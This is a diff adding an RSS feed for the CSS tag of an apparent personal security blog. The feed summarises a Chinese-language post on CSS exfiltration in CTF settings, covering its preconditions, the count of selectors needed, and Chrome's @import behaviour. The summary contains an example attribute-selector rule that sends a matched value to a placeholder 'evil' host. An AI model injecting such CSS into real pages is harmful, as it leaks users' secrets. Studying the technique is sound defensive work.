@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>CSS on Jhe&#39;s blog</title>
+    <link>https://ucgjhe.github.io/tags/css/</link>
+    <description>Recent content in CSS on Jhe&#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 30 Apr 2019 14:53:31 +0800</lastBuildDate><atom:link href="https://ucgjhe.github.io/tags/css/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CSS Exfiltration</title>
+      <link>https://ucgjhe.github.io/post/css_exfiltration/</link>
+      <pubDate>Tue, 30 Apr 2019 14:53:31 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/css_exfiltration/</guid>
+      <description>雖然不是什麼新東西，但是覺得有趣就整理一下
+Why 隨著前端技術越發強大，CSS 也在其中佔有一席之地， CSS exfiltration 技巧也沒在 CTF 少出現過，當然有一些前提條件
+ 目標元素需要在瀏覽器載入網頁階段存在 需要有明確的屬性讓 css selector 可以取到該元素 取到元素之後要有辦法透過像是 background、background-image 等將資料傳遞出去(可能會被 CSP 限制)  假設目標存在CSS injection、HTML injection 卻無法執行 javascript 或是目標存在 RPO 弱點的話，這可能是一個可以考慮的方向，但仍需要視瀏覽器而定
+基本原理是透過 css selector 選取到對定的元素，並依照其屬性判斷來向遠端伺服器送出請求如:#target[value^=&amp;quot;s&amp;quot;]{backround: url(&amp;quot;http://evil/?s&amp;quot;)}，透過這只種方式只要有夠多的 css selector 便可以將目標屬性完全讀出來
+倘若目標屬性的長度較長抑或是複雜度較高(大小寫、數字英文、符號等)則需要的 css selector 便會大增，假設目標是純數字的 8 位密碼，便需要 P(10, 8) = 10!/2! = 1,814,400 這麼多項 css selector，另一方面一次性的大量載入 css 也可能會導致瀏覽器載入速度變慢導致使用者對攻擊&amp;quot;有感&amp;quot;
+有沒有一個方法可以透過跟伺服器互動的方式來減少一次性注入大量的 css 規則到目標瀏覽器中是否可能呢 ?
+How 這裡用到一個 Chrome 瀏覽器的特性，可以讓攻擊者使用 @import 引入一個遠端 CSS 就可以完成任務，使用下列的範例來解釋 Chrome 對 CSS 的解析順序</description>
+    </item>
+    
+  </channel>
+</rss>
